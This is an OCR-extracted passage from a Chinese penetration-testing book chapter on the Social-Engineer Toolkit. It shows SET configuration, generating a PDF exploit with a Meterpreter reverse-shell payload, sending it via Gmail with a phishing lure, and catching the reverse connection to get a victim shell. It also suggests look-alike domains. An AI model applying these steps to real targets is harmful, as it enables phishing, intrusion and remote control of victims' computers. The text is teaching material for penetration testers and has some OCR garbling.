攻击人脑思维的社会工程学技巧。
SET的出现在填补渗透测试领域空白的同时，也使得大家更加关注社会工程学攻击。该工
具包目前已被下载100万多次，而且已经成为业界部署实施社会工程学攻击的标准。SET攻击
人们自身存在的弱点，利用人们的好奇性、信任、贪婪以及一些愚蠢的错误。社会工程学攻击
也已经成为非常普遍，而且对许多组织都造成严重威胁的一种攻击方式。
---
## Page 163
Metasploit渗透测试指南
当然，社会工程学并非新兴事物，但是一个人要哄骗别人让他去做他不想做的事情，不可
能不会与时俱进。安全界许多人都认为社会工程学依然是业界面对的最大安全威胁之一，就是
因为社会工程学攻击很难得到有效的预防。（你可能还记得在极度复杂的极光“Aurora”攻击事
件中，攻击者就是利用了社会工程学技术来攻击Gmail以及其他Google数据的)。
攻击向量是用来获取信息或取得信息系统访问权的渠道。SET通过攻击向量来对攻击进行
分类（例如：基于Web的攻击、基于E-mail的攻击和基于USB 的攻击)。它利用电子邮件、伪
造网页以及其他渠道去攻击目标，很轻松地就能控制个人主机，或者拿到目标主机的敏感信息。
很明显，每个攻击向量的成功概率会因为目标主机的情况以及通信方式的不同而有所差别。SET
同时也支持预先建立E-mail与网页模板，这些模板可以方便地用来进行社会工程学攻击。SET
中也大量使用了Metasploit框架所提供的强大能力。
由于社会工程学攻击具有的天然社会属性，本章的每个例子都会在一个简单的故事场景中
来进行说明讲解。
10.1配置SET工具包
在BackTrack中，SET工具包默认安装在/pentest/exploits/SET目录下。在你启动该程序之
前，确保你使用的是最新版本的SET（通过以下命令进行更新）。
root@bt:/pentest/exploits/set# svn update
更新完成后，根据你的具体需求来修改SET配置文件。我们将介绍几个简单的配置选项，
在SET工具包根目录下的config/set_config文件中。
WEBATTACK_EMAIL是用来标识在Web攻击的同时是否进行邮件钓鱼攻击，这个标识选
项默认是关闭的，这意味着您将配置在使用Web攻击向量时不支持邮件钓鱼。
METASPLOIT_PATH=/opt/framework3/msf3
WEBATTACK_EMAIL=ON
Javaapplet攻击是SET中支持的一种基于Web的攻击方式，使用自签名的Javaapplet程序
来欺骗目标系统的使用者，取得许可后运行。在默认情况下，这种攻击将使用微软作为签名发
布者，然而，如果系统中安装了Java开发工具包（JDK），你可以打开这个选项，并选择任意
SELF_SIGNED_APPLET=ON
自动检测（AUTO_DETECT）选项是SET最重要的选项之一，并且默认是打开的。该选项
打开后使得SET能够检测到所在主机的IP地址，该地址可以作为反向连接的目的地址或者Web
服务器架设地址。如果你使用多个网络接口，或使用反弹连接攻击载荷并指向了另一个IP地址，
136
---
## Page 164
第10章社会工程学工具包
那么你需要关闭这个选项。关闭该选项后，SET需要你确定攻击主机属于哪种配置场景，来确
保IP地址使用方式的正确性，例如其中一个场景包含了NAT和端口转发的功能。这些配置场
景方案的选项在SET接口中可以看到。
AUTO_DETECT=OFF
当你使用工具包的时候，默认会使用基于Python架设的内建Web服务。为了优化服务性
能，需要把apache_server选项开启，SET将会使用Apache服务进行攻击。
APACHE_SERVER=ON
部的选项来改变SET的攻击行为。在搞定配置选项之后，现在我们开始运行工具包。
10.2针对性钓鱼攻击向量
针对性钓鱼攻击向量通过特殊构造的文件格式漏洞渗透攻击（例如利用AdobePDF漏洞的
渗透攻击），主要通过发送邮件附件的方式，将包含渗透代码的文件发送到目标主机，当目标主
机的用户打开邮件附件，目标主机就会被攻陷和控制。SET使用简单邮件管理协议（SMTP）
的开放代理（匿名的或者需认证的）、Gmail和Sendmail来发送邮件。SET同时也使用标准电子
邮件和基于HTML格式的电子邮件来发动钓鱼攻击。
我们来设想-一下以xyz公司为目标进行一次实际的渗透测试。你可以注册一个类似xyz公
司的域名，例如coompanyxyz.com，你也可以在一个相似域名下注册一个子域名，例如
com.panyxyz.com。下一步，你针对目标组织发送一些针对性钓鱼攻击邮件，和往常一样，绝大
多数公司员工只会扫一眼邮件，然后就会打开任何看似合法的邮件附件。在这个例子中，我们
将会发送存在渗透代码的PDF格式文件到目标主机，如下所示：
root@bt:/pentest/exploits/set#./set
Selectfromthemenu:
01.Spear-Phishing Attack Vectors
2.Website Attack Vectors
3.Infectious Media Generator
4.Create a Payload and Listener
5. Mass Mailer Attack
6.Teensy USB HID Attack Vector
7.SMSSpoofing Attack Vector
8.Wireless Access Point Attack Vector
9.Third Party Modules
137
---
## Page 165
Metasploit渗透测试指南
10.Update the Metasploit Framework
11.Update the Social-Engineer Toolkit
12.Help,Credits, and About
13.Exit the Social-Engineer Toolkit
Enter your choice:1
Welcome to the SET E-Mail attack method. This module allows you
to specially craft email messages and send them to a large (or small)
number of people with attached fileformat malicious payloads. If you
want to spoof your email address,be sure "Sendmail" is installed(it
is installed in BT4) and change the config/set_config SENDMAIL=OFF flag
to SENDMAIL=ON.
There are two options,one is getting your feet wet and letting SET do
everything for you (option 1), the second is to create your own FileFormat
payload and use it in your own attack. Either way, good luck and enjoy!
 1.Perform a Mass Email Attack
2.Create a FileFormat Payload
3.Create a Social-Engineering Template
4. Return to Main Menu
Enter your choice:1
Select the file format exploit you want.
The default is the PDF embedded EXE.
**********PAYLOADS**********
1.SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)
2.
：SET Custom Written Document UNC LM SMBCapture Attack
3.Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow
4.Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)
5.
Adobe Flash Player'Button'Remote Code Execution
6.Adobe CoolType SING Table ‘uniqueName′ Overflow
7.Adobe Flash Player 'newfunction′ Invalid Pointer Use
③8.AdobeCollab.collectEmailInfoBuffer Overflow
9.Adobe Collab.getIcon Buffer Overflow
10.Adobe JBIG2Decode Memory Corruption Exploit
11. Adobe PDF Embedded EXE Social Engineering
12.Adobe util.printf() Buffer Overflow
13.Custom EXE to VBA (sent via RAR)(RAR required)
14. Adobe U3D CLoDProgressiveMeshDeclaration Array Overrun
15.Adobe PDF Embedded EXE Social Engineering (NOJS)
16.Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow
17. Nuance PDF Reader v6.o Launch Stack Buffer Overflow
Enter the number you want (press enter for default): 8
1.Windows Reverse TCP Shel
Spawn a command shell on victim and send back to
attacker.
2.Windows Meterpreter Reverse_TCP
Spawn a meterpreter shell on victim andsend back
to attacker.
138
---
## Page 166
第10章社会工程学工具包
3.Windows Reverse VNC DLL
Spawn a VNC server onvictim and send back to
attacker.
4.Windows Reverse TCP Shell (x64)
Windows X64 Command Shell,Reverse TCP Inline
5.Windows Meterpreter Reverse_TCP (X64) Connect back to the attacker (Windows x64),
Meterpreter
6.Windows Shell Bind_TCP (X64)
Execute payload and create an accepting port on
remote system.
7.Windows Meterpreter Reverse HTTPS
Tunnel communication over HTTP using SSL and use
Meterpreter.
①Enter the payload you want(press enter for default):
[*]Windows Meterpreter Reverse TCP selected.
[*]Defaulting to port 443...
[*]Generating fileformat exploit...
[*]Please wait while we load the module tree...
[*]Started reverse handler on 10.10.1.112:443
[*] Creating 'template.pdf' file...
[*]Generated output file /pentest/exploits/set/src/program_junk/template.pdf
[*] Payload creation complete.
[*]All payloads get sent to the src/msf_attacks/template.pdf directory
[*] Payload generation complete. Press enter to continue.
As an added bonus, use the file-format creator in SET to create your attachment.
Right now the attachment will be imported withfilename of'template.whatever’
Do you wantto rename the file?
example Enter the new filename:moo.pdf
1.Keep the filename,I don't care.
2. Rename the file, I want to be cool.
Enter your choice (enter for default): 1
Keeping the filename and moving on.
通过SET的主菜单栏，选择Spear-PhishingAttackVectorsO，紧接着选择performamass
emailattack。这个攻击利用了AbobePDF的Collab.collectEmailInfo漏洞?，默认将Metasploit
中的Meterpreter反向攻击载荷·加载到PDF文件中。Collab.collectEmaillInfo是一个堆溢出漏洞，
如果打开（假设目标主机安装的AbobeAcrobat版本存在此漏洞）PDF文件，那么Meterpreter
就会主动连接攻击主机的443端口，该端口在绝大多数网络中通常是开放连接的。
同时 SET还允许攻击者修改PDF的文件名，使得它更具吸引I力。在我们的场景中，仅仅
出于演示的目的，所以使用了缺省的PDF文件（template.pdf）③。
Social Engineer Toolkit Mass E-Mailer
There are two options on the mass e-mailer, the first would
be to send an email to one individual person.The second option
Se aIdoad Kueu Se 01 11 puas pue 11T e 1rodu1 04 no mo1e 11m
you want within that list.
139
---
## Page 167
Metasploit渗透测试指南
What doyou want todo:
0 1.E-Mail Attack SingleEmail Address
2.E-Mail Attack Mass Mailer
3.Return to main menu.
Enter your choice:1
Do you want to use a predefined template or craft
a one time email template.
② 1.Pre-Defined Template
2.One-Time Use Email Template
Enter your choice:1
Below is a list of available templates:
1:New Update
2:Computer Issue
3: Strange internet usage from your computer
4:Lol...have to check this out...
③ 5:Status Report
6:Pay Raise Application Form
7: WOAAAA!!!!!!!!!! This is craZy...
8:BasketBall Tickets
9:BabyPics
10: Have you seen this?
11: Termination List
12: How long has it been?
13: Dan Brown's Angels & Demons
Enter the number you want to use: 5
Enter whoyou wanttosendemailto:PI:EMAIL
What option do you want to use?
1. Use a GMAIL Account for your email attack.
2.Use your own server or open relay
Enter your choice: 1
 Enter your GMAIL email address: PI:EMAIL
Enter your password for gmail (it will not be displayed back to you):
SEThas finished delivering the emails.
下一步，我们针对单一邮件地址进行攻击·，将SET之前生成的PDF文件作为邮件附件，
并使用一个预先定义的 SET 邮件模板?“Status Report”③。我们让SET使用一个Gmail账户
140
---
## Page 168
第10章社会工程学工具包
最后，创建Metasploit监听端口用来监听攻击载荷反弹连接●。当SET启动Metasploit的
时候，它已经配置了所有必需的选项，并开始处理你所攻击主机的IP反向连接到443端口·，
正如我们之前所配置的那样。
O Do you want to setup a listener yes or no: yes
resource(src/program_junk/meta_config)>use exploit/multi/handler
resource(src/program_junk/meta_config)> set PAYLoAD windows/meterpreter/reverse_tcp
PAYLoAD=>windows/meterpreter/reverse_tcp
resource (src/program_junk/meta_config)> set LHOST 10.10.1.112
LHOST => 10.10.1.112
resource (src/program_junk/meta_config)> set LPoRT 443
LPORT => 443
ENCODING => shikata_ga_nai
resource(src/program_junk/meta_config)>set ExitonSession false
ExitonSession => false
resource (src/program_junk/meta_config)> exploit -j
[*]Exploit running as background job.
@[*]Started reverse handler on 10.10.1.112:443
[*] Starting the payload handler...
msfexploit(handler)>
我们刚刚建立起对邮箱PI:EMAIL的攻击，构造了一个电子邮件发送
给目标，利用了PDF文件漏洞。SET允许攻击者创建不同的模板，并且在使用时支持动态导入。
当目标打开邮件并双击邮件附件的时候，将会看到如图10-1所显示的信息。
图10-1渗透PDF文件在攻击目标的视图
141
---
## Page 169
Metasploit渗透测试指南
目标用户打开他认为合法的PDF文件，与此同时目标主机被立即控制。在攻击者这边，你
会看到如下信息：
[*]Started reverse handler on 10.10.1.112:443
[*]Starting the payload handler...
[*] Meterpreter session 1 opened (10.10.1.112:443 -> 10.10.1.102:58087)
msf exploit(handler)>sessions -i 1
[*]Starting interaction with 1...
meterpreter>shell
Process2976created.
Channel 1 created.
Microsoft Windows XP[Version 5.1.26o0]
(C)Copyright 1985-2001Microsoft Corp
C:\DocumentsandSettings\Bob\Desktop>
发邮件攻击”选项，攻击者也可以创建可被重新利用的定制攻击模板，来取代SET中缺省内含